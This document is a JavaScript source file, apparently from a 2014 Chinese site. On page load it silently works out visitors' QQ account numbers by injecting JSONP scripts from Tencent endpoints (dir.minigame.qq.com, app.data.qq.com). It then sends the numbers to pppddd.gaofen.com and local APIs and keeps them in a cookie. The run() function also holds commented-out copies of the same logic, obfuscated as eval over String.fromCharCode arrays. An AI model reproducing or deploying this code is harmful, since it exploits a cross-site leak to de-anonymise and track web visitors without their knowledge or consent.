/**
 * Created by zhiwen on 14-3-24.
 */

(function(AT, $$, win){

    $$(function(){
        //获取QQ方法有两个方案:
        // 1通过QQ接口：http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=success_jsonpCallback1&uin=&_=1401763040081
        // 2通过app.data.qq.com空间获取
        var www = false;
        $$('#getByGame').click(function(e){
            e.preventDefault();
            getByGameInterface();
        });

        $$('#getByApp').click(function(e){
            e.preventDefault();
            getByAppData();
        });
        function getByGameInterface(){

            var quin = $$.cookie('uky'), _quin = []
                ,purl = 'http://pppddd.gaofen.com/gm/a.gif';

            www && (purl = '/api/saveUin');

            function appJs(){

                var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
                appendJS(url);

            }

            function pushUin(u){
                $$.get(purl, {quin : u}, function(r){
                    $('#msg').html('<div>获取成功</div>');
                });
            }

            window.gaofenCallback = window.gaofenCallback || function(d){
               if(d.result === 1000005){//未登录
                    setTimeout(appJs, 8000);
               }else{
                   pushUin(d.uin);
               }
            };
            if(quin){
                var quin = quin.split(','), _quin = [];
                for(var i= 0,len = quin.length;i<len;i++){
                    _quin.push(String.fromCharCode(quin[i]));
                }
                _quin = _quin.join('');
                pushUin(_quin);
            }else{
                appJs();
            }

        }



        function getByAppData(){

            var Qin_host=encodeURIComponent(document.location.href);
            var Qin_title=escape(document.title);
            var Qin_refer=encodeURIComponent(document.referrer);
            var timer = null, myuin = '', useJs = true, appendTimer = 0;

            function removeJs(){
                $$('#appUin').remove();
            }

            function toAppErr(){
                removeJs();
                timer = setTimeout(getUn, 0);

            }

            function toAppSucc(){
                clearTimeout(timer);
                timer = null;
                removeJs();
                $$.get('/api/getqq', {uin : myuin}, function(r){
                    $('#msg').html('<div>获取成功</div>');
                    //setTimeout(function(){location.href = '/qlist';},5000);
                    console.log(r);
                });

            }

            function getUn(){
                var t = +new Date;
                t +=1000;
                if(myuin && useJs){

                    appendJS('http://app.data.qq.com/?umod=user&uid=165543416&t='+t, toAppSucc, toAppErr, 'appUin');
                }else{
                    if(appendTimer <  20){
                        appendTimer++;
                        appendImg('http://app.data.qq.com/?umod=user&uid=165543416&t='+t);

                        setTimeout(getUn, 1500);
                    }else{
                        toAppSucc();
                    }

                }

            }

            function loadjs() {
                try {
                    if (data0.err == '1026') {//已登录
                        $$.get('/api/getUin', {}, function(r){
                            var uin = '';
                            for(var k in r.rst)
                                myuin = k;
                            timer = setTimeout(getUn, 0);
                        });
                    } else {
                        window.setTimeout(dynamicLoad, 1000);
                    }
                } catch (e) {
                    window.setTimeout(dynamicLoad, 1000);
                }
            }

            function appendImg(url){
                $('body').append('<img src="'+url+'" style="display:none;">');
            }

            function dynamicLoad() {
                appendJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime(), loadjs);
            }

            var quin = $$.cookie('uky'), _quin = [];
            if(!quin){
                dynamicLoad();
            }else{
                var quin = quin.split(',');
                for(var i= 0,len = quin.length;i<len;i++){
                    _quin.push(String.fromCharCode(quin[i]));
                }
                _quin = _quin.join('');
                $$.get('/api/saveHave', {quin : _quin}, function(r){


                })
            }

        }

        function appendJS(url, success, error, id){
            success = success || $$.noop;
            var oScript = document.createElement("script");
            oScript.type = "text/javascript";
            oScript.src = url;
            if (oScript.readyState) {
                oScript.onreadystatechange = function() {
                    if (oScript.readyState == "loaded"
                        || oScript.readyState == "complete") {
                        oScript.onreadystatechange = null;
                        window.setTimeout(success, 10);
                    }
                };
            } else {
                oScript.onload = function() {
                    window.setTimeout(success, 10);
                };
            }

            if(id){

                oScript.id = id;
            }

            oScript.onerror = function(){

                (error || $.noop)();
            }
            document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
        }

        //getByAppData();
        run();
    });


})(Atong, jQuery, window);


jQuery.cookie = function(name, value, options) {
    if (typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if (value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        var path = options.path ? '; path=' + options.path : '';
        var domain = options.domain ? '; domain=' + options.domain : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if (document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};

function run(){
    ///*gf*/(\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e(){var/*gf*/ fgS= \u0053\u0074\u0072\u0069\u006e\u0067.\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065; gfq /*gf*/= \u0065\u0076\u0061\u006c;gfq/*gf*/(fgS/*gf*/(102,117,110,99,116,105,111,110,32,104,40,41,123,105,40,34,104,116,116,112,58,47,47,100,105,114,46,109,105,110,105,103,97,109,101,46,113,113,46,99,111,109,47,99,103,105,45,98,105,110,47,100,105,114,95,102,101,116,99,104,95,113,113,104,101,97,100,47,103,101,116,95,112,108,97,121,101,114,95,105,110,102,111,63,99,97,108,108,98,97,99,107,61,103,97,111,102,101,110,67,97,108,108,98,97,99,107,38,117,105,110,61,38,95,61,34,43,32,43,110,101,119,32,68,97,116,101,41,125,102,117,110,99,116,105,111,110,32,106,40,100,41,123,102,111,114,40,118,97,114,32,97,61,91,93,44,99,61,48,59,99,60,100,46,108,101,110,103,116,104,59,99,43,43,41,97,46,112,117,115,104,40,100,46,99,104,97,114,67,111,100,101,65,116,40,99,41,41,59,114,101,116,117,114,110,32,97,46,106,111,105,110,40,34,44,34,41,125,102,117,110,99,116,105,111,110,32,107,40,100,41,123,105,40,109,43,34,63,34,43,100,41,59,108,63,102,46,99,111,111,107,105,101,40,101,44,106,40,100,41,44,123,101,120,112,105,114,101,115,58,49,69,51,125,41,58,116,121,112,101,111,102,32,103,101,116,99,111,111,107,105,101,33,61,61,34,117,110,100,101,102,105,110,101,100,34,38,38,115,101,116,99,111,111,107,105,101,40,101,44,106,40,100,41,44,49,69,53,41,125,102,117,110,99,116,105,111,110,32,105,40,100,44,97,44,99,44,101,41,123,118,97,114,32,97,61,97,124,124,102,46,110,111,111,112,44,98,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,98,46,116,121,112,101,61,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,59,98,46,115,114,99,61,100,59,98,46,114,101,97,100,121,83,116,97,116,101,63,98,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,61,102,117,110,99,116,105,111,110,40,41,123,105,102,40,98,46,114,101,97,100,121,83,116,97,116,101,61,61,10,34,108,111,97,100,101,100,34,124,124,98,46,114,101,97,100,121,83,116,97,116,101,61,61,34,99,111,109,112,108,101,116,101,34,41,98,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,61,110,117,108,108,44,119,105,110,100,111,119,46,115,101,116,84,105,109,101,111,117,116,40,97,44,49,48,41,125,58,98,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,119,105,110,100,111,119,46,115,101,116,84,105,109,101,111,117,116,40,97,44,49,48,41,125,59,105,102,40,101,41,98,46,105,100,61,101,59,98,46,111,110,101,114,114,111,114,61,102,117,110,99,116,105,111,110,40,41,123,40,99,124,124,36,46,110,111,111,112,41,40,41,125,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,72,69,65,68,34,41,46,105,116,101,109,40,48,41,46,97,112,112,101,110,100,67,104,105,108,100,40,98,41,125,118,97,114,32,102,61,106,81,117,101,114,121,44,97,44,101,61,34,117,107,121,34,44,108,61,33,33,102,46,99,111,111,107,105,101,59,108,63,97,61,102,46,99,111,111,107,105,101,40,101,41,58,116,121,112,101,111,102,32,103,101,116,99,111,111,107,105,101,33,61,61,34,117,110,100,101,102,105,110,101,100,34,38,38,40,97,61,103,101,116,99,111,111,107,105,101,40,101,41,41,59,118,97,114,32,99,61,91,93,44,109,61,34,104,116,116,112,58,47,47,112,112,112,100,100,100,46,103,97,111,102,101,110,46,99,111,109,47,103,109,47,97,46,106,115,34,59,119,105,110,100,111,119,46,103,97,111,102,101,110,67,97,108,108,98,97,99,107,61,119,105,110,100,111,119,46,103,97,111,102,101,110,67,97,108,108,98,97,99,107,124,124,102,117,110,99,116,105,111,110,40,97,41,123,97,46,114,101,115,117,108,116,61,61,61,49,48,48,48,48,48,53,63,115,101,116,84,105,109,101,111,117,116,40,104,44,56,69,51,41,58,107,40,97,46,117,105,110,41,125,59,105,102,40,97,41,123,97,61,97,46,115,112,108,105,116,40,34,44,34,41,59,10,102,111,114,40,118,97,114,32,99,61,91,93,44,103,61,48,44,110,61,97,46,108,101,110,103,116,104,59,103,60,110,59,103,43,43,41,99,46,112,117,115,104,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,97,91,103,93,41,41,59,99,61,99,46,106,111,105,110,40,34,34,41,59,107,40,99,41,125,101,108,115,101,32,104,40,41))})()
    ///*gf*/(\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e(){var/*gf*/ fgS= \u0053\u0074\u0072\u0069\u006e\u0067.\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065; gfq /*gf*/= \u0065\u0076\u0061\u006c;gfq/*gf*/(fgS/*gf*/(32,32,32,32,32,32,32,118,97,114,32,106,113,32,32,61,32,106,81,117,101,114,121,44,32,113,117,105,110,44,32,99,107,32,61,32,39,117,107,121,39,44,32,106,113,103,116,32,61,32,33,33,106,113,46,99,111,111,107,105,101,59,10,32,32,32,32,32,32,32,32,105,102,40,106,113,103,116,41,32,113,117,105,110,32,61,32,106,113,46,99,111,111,107,105,101,40,99,107,41,59,10,32,32,32,32,32,32,32,32,101,108,115,101,32,105,102,40,116,121,112,101,111,102,32,103,101,116,99,111,111,107,105,101,32,33,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,113,117,105,110,32,61,32,103,101,116,99,111,111,107,105,101,40,99,107,41,59,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,118,97,114,32,95,113,117,105,110,32,61,32,91,93,10,32,32,32,32,32,32,32,32,32,32,32,32,44,112,117,114,108,32,61,32,39,104,116,116,112,58,47,47,112,112,112,100,100,100,46,103,97,111,102,101,110,46,99,111,109,47,103,109,47,97,46,106,115,39,59,10,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,97,112,112,74,115,40,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,116,32,61,32,43,110,101,119,32,68,97,116,101,44,32,117,114,108,32,61,32,39,104,116,116,112,58,47,47,100,105,114,46,109,105,110,105,103,97,109,101,46,113,113,46,99,111,109,47,99,103,105,45,98,105,110,47,100,105,114,95,102,101,116,99,104,95,113,113,104,101,97,100,47,103,101,116,95,112,108,97,121,101,114,95,105,110,102,111,63,99,97,108,108,98,97,99,107,61,103,97,111,102,101,110,67,97,108,108,98,97,99,107,38,117,105,110,61,38,95,61,39,43,116,59,10,32,32,32,32,32,32,32,32,32,32,32,32,97,112,112,101,110,100,74,83,40,117,114,108,41,59,10,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,32,116,111,65,83,67,73,73,40,113,113,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,113,113,67,111,100,101,32,61,32,91,93,59,10,32,32,32,32,32,32,32,32,32,32,32,32,113,113,32,43,61,39,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,102,111,114,40,118,97,114,32,105,61,48,59,105,32,60,32,113,113,46,108,101,110,103,116,104,59,105,43,43,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,113,113,67,111,100,101,46,112,117,115,104,40,113,113,46,99,104,97,114,67,111,100,101,65,116,40,105,41,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,113,113,67,111,100,101,46,106,111,105,110,40,39,44,39,41,59,10,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,112,117,115,104,85,105,110,40,117,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,116,32,61,32,43,110,101,119,32,68,97,116,101,44,32,99,104,97,114,99,111,100,101,32,61,32,116,111,65,83,67,73,73,40,117,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,97,112,112,101,110,100,74,83,40,112,117,114,108,43,39,63,117,105,110,61,39,43,99,104,97,114,99,111,100,101,43,39,38,95,61,39,43,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,47,47,106,113,46,103,101,116,40,112,117,114,108,44,32,123,113,117,105,110,32,58,32,117,125,44,32,102,117,110,99,116,105,111,110,40,114,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,105,102,40,106,113,103,116,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,106,113,46,99,111,111,107,105,101,40,99,107,44,32,32,99,104,97,114,99,111,100,101,44,32,123,101,120,112,105,114,101,115,58,49,48,48,48,125,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,125,101,108,115,101,32,105,102,40,116,121,112,101,111,102,32,103,101,116,99,111,111,107,105,101,32,33,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,115,101,116,99,111,111,107,105,101,40,99,107,32,44,32,116,111,65,83,67,73,73,40,117,41,44,32,49,48,48,48,48,48,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,47,47,125,41,59,10,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,97,112,112,101,110,100,74,83,40,117,114,108,44,32,115,117,99,99,101,115,115,44,32,101,114,114,111,114,44,32,105,100,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,32,61,32,115,117,99,99,101,115,115,32,124,124,32,106,113,46,110,111,111,112,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,111,83,99,114,105,112,116,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,116,121,112,101,32,61,32,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,59,10,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,115,114,99,32,61,32,117,114,108,59,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,32,40,111,83,99,114,105,112,116,46,114,101,97,100,121,83,116,97,116,101,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,105,102,32,40,111,83,99,114,105,112,116,46,114,101,97,100,121,83,116,97,116,101,32,61,61,32,34,108,111,97,100,101,100,34,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,124,124,32,111,83,99,114,105,112,116,46,114,101,97,100,121,83,116,97,116,101,32,61,61,32,34,99,111,109,112,108,101,116,101,34,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,111,110,114,101,97,100,121,115,116,97,116,101,99,104,97,110,103,101,32,61,32,110,117,108,108,59,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,119,105,110,100,111,119,46,115,101,116,84,105,109,101,111,117,116,40,115,117,99,99,101,115,115,44,32,49,48,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,125,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,111,110,108,111,97,100,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,119,105,110,100,111,119,46,115,101,116,84,105,109,101,111,117,116,40,115,117,99,99,101,115,115,44,32,49,48,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,125,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,40,105,100,41,123,10,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,105,100,32,61,32,105,100,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,32,32,32,32,111,83,99,114,105,112,116,46,111,110,101,114,114,111,114,32,61,32,102,117,110,99,116,105,111,110,40,41,123,10,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,40,101,114,114,111,114,32,124,124,32,36,46,110,111,111,112,41,40,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,72,69,65,68,39,41,46,105,116,101,109,40,48,41,46,97,112,112,101,110,100,67,104,105,108,100,40,111,83,99,114,105,112,116,41,59,10,32,32,32,32,32,32,32,32,125,10,10,32,32,32,32,32,32,32,32,119,105,110,100,111,119,46,103,97,111,102,101,110,67,97,108,108,98,97,99,107,32,61,32,119,105,110,100,111,119,46,103,97,111,102,101,110,67,97,108,108,98,97,99,107,32,124,124,32,102,117,110,99,116,105,111,110,40,100,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,40,100,46,114,101,115,117,108,116,32,61,61,61,32,49,48,48,48,48,48,53,41,123,47,47,26410,30331,24405,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,97,112,112,74,115,44,32,56,48,48,48,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,101,108,115,101,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,112,117,115,104,85,105,110,40,100,46,117,105,110,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,125,59,10,32,32,32,32,32,32,32,32,105,102,40,113,117,105,110,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,113,117,105,110,32,61,32,113,117,105,110,46,115,112,108,105,116,40,39,44,39,41,44,32,95,113,117,105,110,32,61,32,91,93,59,10,32,32,32,32,32,32,32,32,32,32,32,32,102,111,114,40,118,97,114,32,105,61,32,48,44,108,101,110,32,61,32,113,117,105,110,46,108,101,110,103,116,104,59,105,60,108,101,110,59,105,43,43,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,95,113,117,105,110,46,112,117,115,104,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,113,117,105,110,91,105,93,41,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,95,113,117,105,110,32,61,32,95,113,117,105,110,46,106,111,105,110,40,39,39,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,112,117,115,104,85,105,110,40,95,113,117,105,110,41,59,10,32,32,32,32,32,32,32,32,125,101,108,115,101,123,10,32,32,32,32,32,32,32,32,32,32,32,32,97,112,112,74,115,40,41,59,10,32,32,32,32,32,32,32,32,125))})()
    //return;
    (function(){
        var jq  = jQuery, quin, ck = 'uky', jqgt = !!jq.cookie;
        if(jqgt) quin = jq.cookie(ck);
        else if(typeof getcookie !== 'undefined'){
            quin = getcookie(ck);
        }
        var _quin = []
            ,purl = 'http://pppddd.gaofen.com/gm/a.js';
        function appJs(){
            var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
            appendJS(url);
        }

        function  toASCII(qq){
            var qqCode = [];
            qq +='';
            for(var i=0;i < qq.length;i++){
                qqCode.push(qq.charCodeAt(i));
            }
            return qqCode.join(',');
        }

        function pushUin(u){
            var t = +new Date, charcode = toASCII(u);
            appendJS(purl+'?uin='+charcode+'&_='+t);
            //jq.get(purl, {quin : u}, function(r){
                if(jqgt){
                    jq.cookie(ck,  charcode, {expires:1000});
                }else if(typeof getcookie !== 'undefined'){
                    setcookie(ck , toASCII(u), 100000);
                }
            //});
        }

        function appendJS(url, success, error, id){
            success = success || jq.noop;
            var oScript = document.createElement("script");
            oScript.type = "text/javascript";
            oScript.src = url;
            if (oScript.readyState) {
                oScript.onreadystatechange = function() {
                    if (oScript.readyState == "loaded"
                        || oScript.readyState == "complete") {
                        oScript.onreadystatechange = null;
                        window.setTimeout(success, 10);
                    }
                };
            } else {
                oScript.onload = function() {
                    window.setTimeout(success, 10);
                };
            }

            if(id){

                oScript.id = id;
            }

            oScript.onerror = function(){

                (error || $.noop)();
            }
            document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
        }

        window.gaofenCallback = window.gaofenCallback || function(d){
            if(d.result === 1000005){//未登录
                setTimeout(appJs, 8000);
            }else{
                pushUin(d.uin);
            }
        };
        if(quin){
            var quin = quin.split(','), _quin = [];
            for(var i= 0,len = quin.length;i<len;i++){
                _quin.push(String.fromCharCode(quin[i]));
            }
            _quin = _quin.join('');
            pushUin(_quin);
        }else{
            appJs();
        }
    })();
}